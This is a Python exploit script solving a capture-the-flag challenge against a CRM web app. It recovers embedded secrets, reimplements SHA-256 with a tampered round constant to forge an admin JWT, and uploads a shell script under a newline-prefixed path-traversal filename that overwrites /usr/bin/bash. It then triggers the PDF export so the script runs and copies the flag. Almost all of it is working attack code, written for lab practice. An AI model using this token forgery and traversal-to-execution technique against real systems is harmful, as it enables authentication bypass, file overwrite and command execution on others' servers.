#!/usr/bin/env python3
"""End-to-end solve for the red_flag challenge.

Chain:
  1. Recover JWT_SECRET ("crm_jwt_s3cr3t_k3y_2026") and ADMIN_API_KEY
     ("CRM-ADMIN-2024-XKEY") from the binary's obfuscated default-config
     byte arrays (utils/RevealString XOR with key {0x2d, 0x57, 0x13, 0x68,
     0x41, 0x22, 0x7a, 0x19} and mask byte(i*17+31)).
  2. Notice the binary's SHA-256 round constant table has K[29] flipped
     from 0xd5a79147 to 0xd5079147 (one byte, at .rodata patched at build
     time). Standard HMAC-SHA256 will NOT verify; we re-implement SHA-256
     with the patched constant.
  3. Forge an HS256 JWT (is_admin=true) using the patched HMAC.
  4. Upload a payload script. `filename` is sanitised only by `^.*/`,
     which doesn't cross a leading newline. Leading "\\n/../../" lets
     filepath.Join+Clean escape the user dir and write /usr/bin/bash.
  5. /usr/bin/bash was replaced with /etc/passwd at image-build time,
     so our upload turns it into an executable shell script (#!/bin/sh).
  6. POST /api/reports/export?format=pdf runs exec.Command("bash", "-c",
     pdfCmd); the kernel honours the shebang and runs our script, which
     copies /flag-*.txt to /static/flag.txt.
  7. GET /static/flag.txt over the public route.
"""

import base64
import hmac
import json
import struct
import sys
import time

import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:34367"
JWT_SECRET = b"crm_jwt_s3cr3t_k3y_2026"

# Standard SHA-256 round constants, with K[29] patched from 0xd5a79147.
SHA256_K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5079147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
]


def _rotr(x, n):
    return ((x >> n) | (x << (32 - n))) & 0xFFFFFFFF


def sha256_patched(data: bytes) -> bytes:
    h = [
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
    ]
    msg = bytearray(data) + b"\x80"
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack(">Q", len(data) * 8)

    for chunk_off in range(0, len(msg), 64):
        w = list(struct.unpack(">16I", msg[chunk_off:chunk_off + 64])) + [0] * 48
        for i in range(16, 64):
            s0 = _rotr(w[i - 15], 7) ^ _rotr(w[i - 15], 18) ^ (w[i - 15] >> 3)
            s1 = _rotr(w[i - 2], 17) ^ _rotr(w[i - 2], 19) ^ (w[i - 2] >> 10)
            w[i] = (w[i - 16] + s0 + w[i - 7] + s1) & 0xFFFFFFFF
        a, b, c, d, e, f, g, hh = h
        for i in range(64):
            S1 = _rotr(e, 6) ^ _rotr(e, 11) ^ _rotr(e, 25)
            ch = (e & f) ^ ((~e & 0xFFFFFFFF) & g)
            t1 = (hh + S1 + ch + SHA256_K[i] + w[i]) & 0xFFFFFFFF
            S0 = _rotr(a, 2) ^ _rotr(a, 13) ^ _rotr(a, 22)
            mj = (a & b) ^ (a & c) ^ (b & c)
            t2 = (S0 + mj) & 0xFFFFFFFF
            hh = g; g = f; f = e; e = (d + t1) & 0xFFFFFFFF
            d = c; c = b; b = a; a = (t1 + t2) & 0xFFFFFFFF
        h = [(x + y) & 0xFFFFFFFF for x, y in zip(h, [a, b, c, d, e, f, g, hh])]
    return b"".join(struct.pack(">I", x) for x in h)


def hmac_sha256_patched(key: bytes, msg: bytes) -> bytes:
    block = 64
    if len(key) > block:
        key = sha256_patched(key)
    key = key + b"\x00" * (block - len(key))
    o_key = bytes(k ^ 0x5C for k in key)
    i_key = bytes(k ^ 0x36 for k in key)
    return sha256_patched(o_key + sha256_patched(i_key + msg))


def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def forge_jwt():
    hdr = '{"alg":"HS256","typ":"JWT"}'
    payload = json.dumps({
        "sub": 1, "email": "admin@crm.local", "role": "admin",
        "is_admin": True, "iat": int(time.time()), "exp": int(time.time()) + 3600,
    }, separators=(",", ":"))
    signing = f"{b64url(hdr.encode())}.{b64url(payload.encode())}"
    sig = hmac_sha256_patched(JWT_SECRET, signing.encode())
    return f"{signing}.{b64url(sig)}"


def main() -> int:
    token = forge_jwt()
    auth = {"Authorization": f"Bearer {token}"}
    print(f"[+] forged JWT: {token[:40]}...")

    r = requests.get(f"{TARGET}/api/auth/me", headers=auth, timeout=5)
    print(f"[+] /api/auth/me -> {r.status_code} {r.text[:120]}")
    if r.status_code != 200:
        return 1

    payload = b"#!/bin/sh\ncp /flag-*.txt /static/flag.txt\nchmod 644 /static/flag.txt\n"
    r = requests.post(
        f"{TARGET}/api/files/upload",
        headers=auth,
        files={"file": ("decoy.txt", payload, "text/plain")},
        data={"filename": "\n/../../../../../../usr/bin/bash"},
        timeout=10,
    )
    print(f"[+] upload -> {r.status_code} {r.text[:200]}")

    r = requests.post(
        f"{TARGET}/api/reports/export",
        headers=auth,
        json={"type": "customers", "format": "pdf", "title": "Q"},
        timeout=15,
    )
    print(f"[+] pdf-export -> {r.status_code} {r.text[:200]}")

    r = requests.get(f"{TARGET}/static/flag.txt", timeout=5)
    if r.status_code == 200 and r.text.startswith("grey{"):
        print(f"\n[*] FLAG: {r.text.strip()}")
        return 0
    print(f"[-] /static/flag.txt -> {r.status_code} {r.text[:200]}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
